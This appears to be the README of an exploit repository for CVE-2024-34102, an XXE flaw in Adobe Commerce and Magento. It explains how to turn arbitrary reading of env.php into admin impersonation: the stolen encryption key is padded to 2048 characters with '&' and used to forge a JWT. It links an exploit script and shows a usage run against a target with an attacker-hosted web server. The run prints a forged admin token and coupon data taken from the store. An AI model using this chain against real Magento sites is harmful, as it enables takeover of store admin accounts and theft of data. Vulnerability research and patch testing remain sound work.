# CVE-2024-34102: Magento admin user impersonation via arbitrary file read

## Information  

**Vendor Description**: Adobe Commerce and Magento Open Source are affected by an Improper Restriction of XML External Entity Reference ('XXE') vulnerability that could result in arbitrary code execution. An attacker could exploit this vulnerability by sending a crafted XML document that references external entities. Exploitation of this issue does not require user interaction. 
**Versions Affected**: Adobe Commerce and Magento Open Source 2.4.7, 2.4.6-p5, 2.4.5-p7, 2.4.4-p8 and earlier.   
**Researcher:** [Sergey Temnikov](https://github.com/spacewasp)   
**Write-up Link:** Coming soon  
**NIST CVE Link:** https://www.cve.org/CVERecord?id=CVE-2024-34102  


The security flaw arises from improperly handling nested deserialization in Adobe Commerce and Magento. This vulnerability allows attackers to exploit XML External Entities (XXE) during deserialization. In essence, attackers can craft malicious JSON payloads that instantiate objects with unintended properties or behaviors when deserialized by the application ([source](https://github.com/spacewasp/public_docs/blob/main/CVE-2024-34102.md)).

In his write-up, [Sergey Temnikov](https://github.com/spacewasp) suggested that this vulnerability could be chained with CVE-2024-2961 to achieve remote code execution. He also proposed using this vulnerability to read the `env.php` file and obtain the encryption key, which would allow generating a JWT token to impersonate an admin user.

However, the available exploits and write-ups we have found only cover the basic arbitrary file read vector. Therefore, we decided to go beyond that and demonstrate how to use the CVE-2024-34102 to impersonate an admin user.

### Token generation

Plenty of write-ups about the vulnerability itself are available, so we will skip the details and focus on what those write-ups lack: token generation.

After reading the `env.php` file and obtaining the encryption `'crypt' => [ 'key' => ...`, we immediately tried to generate a token, but it didn't work. The token was invalid. That's because, in Magento, the key must be 2048 characters long; if it is not, padding will be applied. 

```php
   public function __construct(DeploymentConfig $deploymentConfig, JwkFactory $jwkFactory)
    {
        $this->keys = preg_split('/\s+/s', trim((string)$deploymentConfig->get('crypt/key')));
        //Making sure keys are large enough.
        foreach ($this->keys as &$key) {
            $key = str_pad($key, 2048, '&', STR_PAD_BOTH);
        }
        $this->jwkFactory = $jwkFactory;
    }
```
<!----><div align="center">
([source](https://github.com/magento/magento2/blob/2.4-develop/app/code/Magento/JwtUserToken/Model/SecretBasedJwksFactory.php#L39-L41))
</div>

### Exploit

We have created a script that reads the `env.php` file, extracts the encryption key, and generates a JWT token to impersonate an admin user. The script is available [here](./exploit.rb).

### Usage

```bash
$ ruby exploit.rb http://localhost http://host.docker.internal:8000
Starting web server...
Generated JWT: eyJraWQiOiIxIiwiYWxnIjoiSFMyNTYifQ.eyJ1aWQiOjIsInV0eXBpZCI6MiwiaWF0IjoxN....
Sending request with JWT to coupons endpoint
Available coupons:
{
  "items": [
    {
      "coupon_id": 2,
      "rule_id": 2,
      "code": "100OFF",
      "usage_limit": 1000,
      "usage_per_customer": 1000,
      "times_used": 0,
      "is_primary": true,
      "created_at": "2024-07-21 18:14:43",
      "type": 0
    }
  ],
  "search_criteria": {
    "filter_groups": [

    ]
  },
  "total_count": 1
}
Exploit completed
```